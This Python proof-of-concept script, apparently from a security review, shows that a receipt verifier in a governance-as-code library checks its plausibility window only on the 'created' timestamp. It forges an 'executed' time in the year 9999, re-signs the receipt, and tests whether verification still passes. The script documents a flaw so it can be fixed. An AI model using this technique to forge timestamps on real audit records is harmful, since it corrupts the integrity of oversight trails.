#!/usr/bin/env python3
"""poc_alpha_5 — one-sided time window: the 2015 floor and +24h future cap
apply ONLY to timestamps.created. timestamps.executed is checked for
parseability and executed>=created — never for plausibility.

A signer records an action "executed" in the year 9999 (or any absurd
future date) and the receipt verifies PASS with time_attested=True.
F1's changelog claims "valid RFC3339 times with executed >= created" — but
the plausibility window the field header advertises (2015 floor, +24h
future) silently covers only half the timeline.

Threat model: signer is the adversary (standard for this review, matching
v1's confirmed classes). The mutation+resign below models a signer that does
not use the stock build_receipt (or runs a patched one).
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         canonical, sha256_hex, sign, keyid, PREDICATE_TYPE)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
        "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

def resign(stmt, sk):
    stmt["subject"]["digest"]["sha256"] = sha256_hex(canonical(stmt["predicate"]))
    payload = canonical({k: v for k, v in stmt.items() if k != "signatures"})
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

sk, pk = generate_keypair()
r = build_receipt(action_id="a-900", subject_name="prod:svc", actor=SVC,
                  policy_decision=POL,
                  execution={"side_effect_class": "WRITE_IRREVERSIBLE", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

r["predicate"]["timestamps"]["executed"] = "9999-12-31T23:59:59Z"  # ~8000 years after `created`
resign(r, sk)

v = verify_receipt(r, pk)
print(f"[*] created = {r['predicate']['timestamps']['created']}")
print(f"[*] executed = {r['predicate']['timestamps']['executed']}")
print(f"[*] verdict={v.verdict}  signature_valid={v.signature_valid}  time_attested={v.time_attested}")
print(f"[*] reasons={v.reasons}")

works = v.verdict == "PASS" and v.time_attested is True
print("EXPLOIT-WORKS" if works else "HELD")
